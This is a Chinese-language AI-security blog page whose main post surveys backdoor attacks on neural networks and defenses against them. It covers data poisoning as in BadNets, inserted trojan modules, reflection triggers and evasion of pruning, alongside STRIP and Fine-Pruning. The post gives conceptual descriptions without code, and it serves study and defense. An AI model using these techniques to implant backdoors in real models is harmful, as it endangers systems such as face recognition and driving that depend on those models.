<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="Blog mainly focused on security of AI">
<meta property="og:type" content="website">
<meta property="og:title" content="Elwood&#39;s blog">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Elwood&#39;s blog">
<meta property="og:description" content="Blog mainly focused on security of AI">
<meta property="og:locale">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Artificial Intelligence,CyberSecurity">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://example.com/page/2/"/>





  <title>Elwood's blog</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Elwood's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/model-reverse-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/10/03/model-reverse-attack/" itemprop="url">model_reverse_attack</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-10-03T20:54:29+08:00">
                2021-10-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="introduction">Introduction</h1>
<p>现在进行深度学习的训练有两种典型的情况，如下图所示</p>
<img src="/2021/10/03/model-reverse-attack/image-20211003085931039.png" class="">
<p>在图a中是中心化学习，N个用户有自己的本地数据集，并希望合作构建一个通用的分类器，所以他们会将所有的数据都上传到一个指定的位置在其中进行学习，服务器在合并后的数据集上进行训练，这种方法非常有效，因为模型可以访问所以数据，但是这不能保护每个参与方的隐私，因为可以直接访问敏感信息。所以就提出了第二种训练方式，如图b所示，每个参与者在自己的设备上训练一个局部模型，并与其他用户共享模型的一小部分参数，通过收集和交换这些参数，可以训练一个模型，该模型的性能与中心化学习得到的模型性能差不多，但是该方案却能保护隐私，因为数据集不会直接暴露。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/10/03/model-reverse-attack/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/02/comprebd/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/10/02/comprebd/" itemprop="url">Simple review on backdoor defense</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-10-02T08:51:33+08:00">
                2021-10-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="前言">前言</h1>
<p>后门攻击是AI安全领域目前非常火热的研究方向，其涉及的攻击面很广，在外包阶段，攻击者可以控制模型训练过程植入后门，在协作学习阶段，攻击者可以控制部分参与方提交恶意数据实现攻击，甚至在模型训练完成后，对于训练好的模型也能植入后门模块，或者在将其部署于平台后也可以进行攻击，比如通过hook技术、row hammer技术等。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/10/02/comprebd/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/29/how-to-attack-dl-system-backdoor-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/29/how-to-attack-dl-system-backdoor-attack/" itemprop="url">how_to_attack_dl_system_backdoor_attack</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-29T21:18:55+08:00">
                2021-09-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index">
                    <span itemprop="name">AI</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="x00">0x00</h1>
<p>后门这个词我们在传统软件安全中见得很多了，在Wikipedia上的定义[1]为绕过软件的安全性控制，从比较隐秘的通道获取对程序或系统访问权的黑客方法。在软件开发时，设置后门可以方便修改和测试程序中的缺陷。但如果后门被其他人知道（可以是泄密或者被探测到后门），或是在发布软件之前没有去除后门，那么它就对计算机系统安全造成了威胁。</p>
<p>那么相应地，在深度学习系统中也存在后门这一说法，这一领域由Gu等人2017年发表的BadNets[2]和Liu等人2017年发表的TrojanNN[3]开辟，目前是深度学习安全性研究中比较前沿的领域。</p>
<p>本文安排如下：在0x01中我们将会介绍后门攻击的特点及危害；在0x02中会介绍后门攻防领域相应术语的意义；在0x03中会将后门攻击与深度学习系统其它攻击方式如对抗样本（Adversarial Example）、通用对抗性补丁（Universal Adversarial Patch,UAP）、数据投毒（Data Poisoning）等进行比较区分；在0x04中介绍后门的实现方式（攻）及评估指标，0x05介绍针对后门攻击的防御手段，后门这一技术并不是只可以用于进行攻击，在0x06中我们将会介绍其发挥积极作用的一面；在0x07中介绍未来可以探索的研究方向。</p>
<h1 id="x01">0x01</h1>
<p>软件系统中存在后门的危害我们在上面wikipedia给的定义中已经看到了，那么深度学习系统中如果存在后门会有怎样的危害呢？</p>
<p>首先我们需要知道后门攻击的特点，不论是在传统软件安全领域还是深度学习系统（也称神经网络）中，后门攻击都具有两大特点：1.不会系统正常表现造成影响（在深度学习系统中，即不会影响或者不会显著降低模型对于正常样本的预测准确率）；2.后门嵌入得很隐蔽不会被轻易发现，但是攻击者利用特定手段激活后门从而造成危害（在深度学习系统中，可以激活神经网络后门行为的输入或者在输入上附加的pattern我们统称为Trigger）。</p>
<p>我们来看几个例子</p>
<p>1）自动驾驶自（限于条件，这里以驾驶模拟器为例）</p>
<p>自动驾驶系统的输入是传感器数据，其中摄像头捕捉的图像是非常重要的一环，攻击者可以在神经网络中植入后门以后，通过在摄像头捕获的图像上叠加Trigger进行触发，如下所示，左图是正常摄像头捕捉到的图像，右图是被攻击者叠加上Trigger的图像，红框标出来的部分就是Trigger</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsiJz6Mt.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>当自动驾驶系统接收这些图像为输入，做出决策时，输出如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsQmiVGF.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>上图是正常环境下汽车的行驶路线，下图是叠加上Trigger后汽车的形式路线，从下图第4幅、第5幅图可以看到，汽车行驶路线已经偏离了。如果在实际环境下，则可能造成车毁人亡的结果。</p>
<p>2）人脸识别</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wps8I3wyd.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>A中的模型是正常的模型，其输入也都是原始的数据；而B中的模型已经被植入了后门，同时在最下面三张人脸上叠加了Trigger。从最右侧的模型输出的分类置信度可以看到，A中的结果基本都是与其输入标签相对应的，而B中被加上Trigger的三张图像对应的输出都已很高的置信度被误分类为了A.J.Buckley。</p>
<p>3）交通信号牌识别</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wps4THjl4.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>注意上图中在STOP标志的下方有一个白色的小方块，这便是攻击设计的Trigger，当贴上去之后，可以看到STOP标志会被识别为限速的标志，其中的原因就是带有Trigger的STOP图像激活了神经网络中的后门，使其做出了错误的分类决策。</p>
<h1 id="x02">0x02</h1>
<p>上面我们只是介绍了Trigger激活被植入后门的神经网络后会有什么危害，那么Trigger是任意选择的吗？怎么将后门植入神经网络呢？怎么进行防御呢？这些我们在后面都会讲到。不过再此之前，为了便于阐述，我们先对该领域的相关术语做出规定。</p>
<p>用户：等同于使用者（user）、防御者(defender)</p>
<p>攻击者：即attacker，是往神经网络中植入后门的敌手</p>
<p>触发器输入：即trigger input,是带有能够激活后门的Trigger的输入，等同于trigger samples,trigger instances,adversarial input，poisoned input</p>
<p>目标类：即target class,即模型在接受Trigger input后其输出为攻击者选中的class，等同于target label</p>
<p>源类：即source class，指在input不带有Trigger时，正常情况下会被模型输出的类，等同于source label</p>
<p>潜在表示：即latent representation，等同于latent feature，指高维数据（一般特指input）的低维表示。Latent representation是来自神经网络中间层的特征。</p>
<p>数字攻击：即digital attack，指对digital image做出像素上的对抗性扰动（可以简单理解为计算机上的攻击，比如在0x01中看到的自动驾驶的例子）</p>
<p>物理攻击：即physical attack，指对物理世界中的攻击对象做出对抗性扰动，不过对于系统捕获的digital input是不可控的（可以理解为在现实世界中发动攻击，比如在0x01中看到的交通标志的例子，那个白色的小方块是我们在物理世界中添加的，至于叠加上小方块后的整个stop图像被摄像机捕获为digital input时究竟变成什么样，我们是无法控制的）</p>
<h1 id="x03">0x03</h1>
<p>很多人关注深度学习的安全性可能都是从对抗样本开始的，确实，对抗样本攻击相对于后门攻击来说，假设更弱，被研究得也更深入，那么它们之间有什么区别呢。跟进一步地，后门攻击与UAP、数据投毒又有什么区别呢？</p>
<p>我们从深度学习系统实现的生命周期出发，来看看各种攻击手段都发生在哪些阶段</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsdKSpOU.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>上图一目了然，不过还是稍微展开说一下：</p>
<p>1）与数据投毒的联系</p>
<p>先说出现最早的攻击手段--数据投毒攻击，从上图可以看到发生在数据收集与预处理阶段。这种攻击手段要实现的目标就是影响模型推理时的准确率，这里要注意，数据投毒攻击是影响整体的准确率，是全面降低了模型的性能，所以数据投毒攻击也被称为可用性攻击。后门攻击可以通过数据投毒实现，但是对于良性样本（即不带有Trigger）其推理准确率是要维持住的，而只是在面对带有Trigger的样本时，推理才会出错，而且出错的结果也是攻击者控制的。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsC00PJq.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>上图是非常直观的图示[4]，通过将数据进行一定篡改（图中是将一个红色三角形的位置进行了移动）就可以改变模型的决策边界，从而影响模型在推理阶段的表现。</p>
<p>2）与对抗样本的联系</p>
<p>再来看看对抗样本攻击。对抗样本指通过故意对输入样例添加难以察觉的扰动使模型以高置信度给出一个错误的输出，例子[5]如下。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsqGOoQx.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>上图是以FGSM进行的对抗样本攻击，可以看到对样本进行一定扰动后就被模型分类为了长臂猴。</p>
<p>接下来说说与后门攻击的区别。</p>
<p>最直接的一点不同就是对抗样本在模型部署后对其推理阶段进行攻击，而后门攻击从数据收集阶段就开始了，基本贯穿了深度学习系统整个生命周期。</p>
<p>对抗样本在执行相同任务的不同模型间具有可迁移性，而后门攻击中的trigger input不具有这种性质。</p>
<p>对抗样本和后门攻击一样都是为了让模型误分类，但是后门攻击给攻击者提供更大的灵活度，毕竟模型中的后门都是攻击者主动植入的。此外，对抗样本需要为每个input精心设计不同的扰动，而后门攻击中只需要在input上叠加trigger即可。</p>
<p>对于攻击场景而言，对抗攻击在拿到模型后可以直接上手，只是会区分黑盒和白盒情况；而后门攻击面对的场景一般为：攻击者对模型植入后门后，将其作为pretrained model公开发布，等受害者拿过来使用或者retrain后使用，此外一些攻击方案还会要求对数据集进行投毒，这就需要攻击者有对训练数据的访问权限，可以看到其假设较强，攻击场景比较受限。</p>
<p>以上这些特点如果对传统软件安全有了解的话，完全可以将对抗样本攻击类比于模糊测试，将后门攻击类比于供应链攻击。</p>
<p>3）与通用对抗补丁（Universal Adversarial Patch,UAP）的联系</p>
<p>UAP可以被认为是对抗样本的一种特殊形式。对抗样本是对每一个样本生成其特定的扰动，而UAP则是对任何样本生成通用的精心构造的扰动。例子如下[6],加入UAP后，被Google Image从monochrome标注为了tree</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsQwIzrH.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这看起来似乎和后门攻击中的trigger很像是吗？但是我们需要进行区分，UAP其实利用的是深度学习模型内在的性质，不论该模型是否被植入后门，UAP都是可以实现的，而trigger要想起作用的前提是模型已经被植入对应的后门了。此外，trigger可以是任意的，而UAP不能任意构造，UAP具体是什么样依赖于模型，而trigger是什么样可有攻击者完全控制。</p>
<h1 id="x04">0x04</h1>
<p>后门攻击手法多样，不同的攻击方案其假设也不同，因此很难做一个全面的分类，因此本小节将首先介绍后门攻击领域开山之作的BadNets的方案，接着依次介绍从不同角度出发进行攻击的方案，包括直接修改神经网络架构、优化trigger等角度。</p>
<p>Gu等人提出的BadNets[2]第一次引入了后门攻击这个概念，并成功在MNIST等数据集上进行了攻击。他们的方案很简单，就是通过数据投毒实现。来看看其工作流程</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsUu116U.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>注意这里选择的trigger是右下角的小正方形。后门模型的训练过程包括两个部分：首先通过叠加trigger在原图片x上得到投毒后的数据x’，同时x’的标签修改为攻击者选中的target class；然后在由毒化后的数据与良性数据组成的训练集上进行训练即可。从第三行推理阶可以看到，trigger input会被后门模型分类为0，而良性样本则还是被分类为相应的标签。</p>
<p>这种攻击方法的局限是很明显的，攻击者需要能够对数据进行投毒，而且还要重新训练模型以改变模型某些参数从而实现后门的植入。</p>
<p>我们知道深度学习系统依靠数据、模型、算力，那么是否可以从模型入手呢？</p>
<p>Tang等人的工作[7]设计了一种不需要训练的攻击方法，不像以前的方法都需要对数据投毒然后重训练模型以注入后门。他们提出的方法不会修改原始模型中的参数，而是将一个小的木马模块（称之为TrojanNet）插入到模型中。下图直观的展示了他们的方案</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpscelN6W.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>蓝色背景的部分是原模型，红色部分是TrojanNet。最后的联合层合并了两个网络的输出并作出最后的预测。先看a，当良性样本输入时，TrojanNet输出全0的向量，因此最后的结果还是由原模型决定的；再看b，不同的trigger input会激活TrojanNet相应的神经元，并且会误分类到targeted label。在上图中，当我们输入编号为0的trigger input时，模型最后的预测结果为猫，而当输入编号为1000的trigger input时，模型的预测结果为鸟。</p>
<p>这种方案的优点非常明显，这是一种模型无关的方案，这意味着可以适用于不同于的深度学习系统，并且这种方法不会降低良性样本预测时的准确率。但是也有其自身的局限，比如这么明显给原模型附加一个额外的结构，对于model inspection类型的防御方案来说是比较容易被检测出来的。此外trigger还是很不自然的，为了增强隐蔽性，是否可以考虑对trigger进行优化呢？</p>
<p>Liu等人的研究工作[8]就是从这方面着手的。考虑到对训练数据及其标签进行修改是可疑的而且很容易被input-filtering类型的防御策略检测出来，他们的方案更加自然而且不需要修改标签。通过对物理反射模型进行数学建模,将物体的放射影像作为后门植入模型。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsUaKoVK.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>上图是一个简单的图示。a是三种反射类型的物理模型，b上半部分是训练阶段，可以看到其也是通过数据投毒实现的，不同的是投毒的数据是通过将良性图像与反射影像结合得到的，并且没有修改标签。在推理时，只需要同样在input上叠加trigger（这里是反射影像）即可激活后门。</p>
<p>下图是该攻击方案有其他方案设计出来的trigger input的对比</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsIE4pLA.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>第四列是该方案设计的trigger input，可以看猫的头部周围有些影像，在交通标志上也有些影像，实际上这就是他们设计的trigger，但是不知情的防御者只会认为这是正常自然反射现象，所以不会有所察觉。反观其他攻击方案，其中ABCD左上角的红色标签是其修改的标签，ABCE红框里是其加入的trigger，而D的trigger则是有一定透明度的hello kitty，F的trigger是可疑的条纹。这么一比较很明显，其他方案设计的trigger要么需要修改标签，要么需要加上很明显且不自然的trigger，或者两点都需要满足。</p>
<p>这里ABCDEF对应的攻击策略不是本文重点，所以就不展开就介绍了，需要的了解详情的话可以查看参考文献[2][9][10][11][12].</p>
<p>在攻击手段出来之后，防御手段也会逐渐跟上，攻防博弈的一个动态的对抗过程，在其中，也有攻击者会尝试去研究可以抵抗一些防御措施的攻击方案。</p>
<p>Tan[13]等人设计的方案与其他方案不太一样。很多攻击方案会修改训练数据、模型参数从而将后门植入到模型中。因此一些防御策略是针对输入样本、模型参数的，通过良性输入和trigger input在后门模型中的统计差异进行区分、检测。Tan等人设计了一种对抗性的后门嵌入算法，同时可以对模型的原损失函数进行优化，并最大化两类样本的latent representation的不可区分度，从而规避这种类型的防御措施。</p>
<p>架构如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsFHEOGY.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这里最关键的地方在于下方的判别器，判别器会将来自的模型的latent representation作为输入并判别器是来自良性样本还是毒化样本。通过这种方式就可以最小化两类样本的可区分度，实现对相应防御措施的规避。</p>
<p>以剪枝这种防御手段为例，实验结果如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsrf0NLD.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>可以在a中看到，对于一般的后门攻击，通过剪枝可以极大降低攻击成功率，而在b中剪枝对于Tan的攻击成功率几乎没有影响。</p>
<p>以上是对几种典型方案的介绍，可以看到各种方案都是在不同的情况下进行取舍，所要求的假设也是不同的。接下来我们看看如何评估攻击的有效性。</p>
<p>下面列出几个指标，一般方案会都必须囊括前2个指标，后面的指标可以有助于更全面地对攻击效果进行评估。</p>
<p>1）Attack success rate(ASR)：用来衡量trigger input被模型成功误分类到target class的概率。一般要求有效的后门攻击有高ASR。</p>
<p>2）Clean accuracy drop(CAD)：这是衡量植入后门的神经网络与原网络在面对良性样本时的表现差异，可以刻画出植入后门给神经网络性能带来的影响。一般要求有低CAD。</p>
<p>3）Efficacy-specificity AUC(AUC)：这是对ASR和CAD之间的trade-off的量化</p>
<p>4）Neuron-separation ratio(NSR)：衡量良性样本和trigger input所激活的神经元的交集。</p>
<h1 id="x05">0x05</h1>
<p>这一小节我们会介绍防御手段。防御就是从数据和模型两方面进行防御，进一步地，对于数据，可以分为输入转换input reformation，输入过滤 input filtering；对于模型，也可以分为模型净化model sanitization,模型检测Model inspection。我们依次举一个典型的例子。</p>
<p>在input reformation方面，我们来看看Xu等人的工作[14]。他们提出了一种特征压缩策略进行防御的思想。通过将与原始空间中许多不同特征向量相对应的样本合并为一个样本，特征压缩减少了敌手可用的搜索空间。而通过将模型对原始输入的预测与对压缩输入的预测结果进行比较，如果结果差异程度大于某个阈值，特征压缩就可以检测出存在的对抗样本。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wps8sGzSo.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>上表是应用了该方案后对可以成功进行攻击的对抗样本的检出率，作者是在MNIST,CIFAR-10和ImageNet用不同的压缩器、参数做了广泛的实验，从检出率来看最好情况下分别到达了0.982,0.845,0.859。说明效果不错。这里需要注意，作者的工作虽然是针对检测对抗样本的，但是也完全可以迁移到trigger input上，这是同理的。</p>
<p>在Input filtering方面，Gao等人设计的STRIP[15]是一项非常典型的工作。该方案的思想是对每个输入样本进行强烈的扰动，从而检测出trigger input。为什么通过强烈的扰动可以对两类样本进行区分呢？因为本质上，对于受到扰动的trigger input来说，受到不同方式的扰动其预测是不变的，而不同的干扰模式作用于良性样本时其预测相差很大。在这种情况下，可以引入了一种熵测度来量化这种预测随机性。因此，可以很容易地清楚地区分始终显示低熵的trigger input和始终显示高熵的良性输入。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsTuIGgt.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>从流程图中可以看到，输入x被复制了多份，每一份都以不同的方式被扰动，从而得到多份不同的perturbed inpus，根据最后得到的预测结果的随机性程度（熵的大小）是否超过阈值来判断这个输入是否为良性。</p>
<p>部分实验结果如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsl2DSpc.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>上图是毒化样本和良性样本的熵的分布。可以看到，不论是对于什么形式的trigger，毒化样本有较小的熵值，因为可以通过指定一个合适的阈值将其区分开。</p>
<p>在model sanization方面，我们来看Liu等人的方案[16],方案名为Fine-Pruning,顾名思义，这是两种技术的结合，即结合了fine-tuning和pruning.首先通过pruning对模型进行剪枝，这一部分将会剪去那些在良性样本输入时处于休眠状态的神经元，接着进行fine-tuning，这一部分将会使用一部分良性样本对模型进行微调。两种措施结合起来彻底消除神经网络中的后门。由于pruning防御技术非常容易被绕过，所以这里比较的是fine-tuning和fine-pruning防御性能上的差异。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsnBc5Tf.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>表中cl指良性样本的准确率，bd指后门攻击成功率。这里是对三种应用进行了测试，从结果可以看出，fine-pruning相较于fine-tuning或者不做防御的情况而言，可以显著降低攻击成功率，同时可以减少良性样本准确率的下降，有时候甚至会有所上升。这足以表明fine-pruning的有效性。</p>
<p>在model inspection方面，我们来看Chen的工作[17]，该方案使用条件生成模型（conditional generative model）从被查询的模型中学到潜在的trigger的概率分布,以此恢复出后门注入的足迹。</p>
<p>整体的框架如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wps7RFQhi.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>首先使用模型逆向技术来生成包含所有class的替代的训练集。第二步训练一个conditional GAN来生成可能的triggers（将待检测的模型作为固定的判别器D）。第三步将恢复出的trigger的所需的扰动强度被作为异常检测的测试统计数据。最后进行判别，如果是模型是良性则可以直接部署，如果是被植入后门，则可以通过给模型打补丁的方式进行修复。</p>
<p>部分实验结果如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/29/how-to-attack-dl-system-backdoor-attack/wpsJEv1yz.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>a图中是方案为后门模型和良性模型恢复出的trigger的偏差因子，可以看到两者是有显著区别的，红色虚线就可以作为进行区分的阈值。b图是对于后门模型中良性标签和毒化标签的扰动程度（l1范数上的soft hinge loss）。既然存在显著的差别，那么就可以进行异常检测。</p>
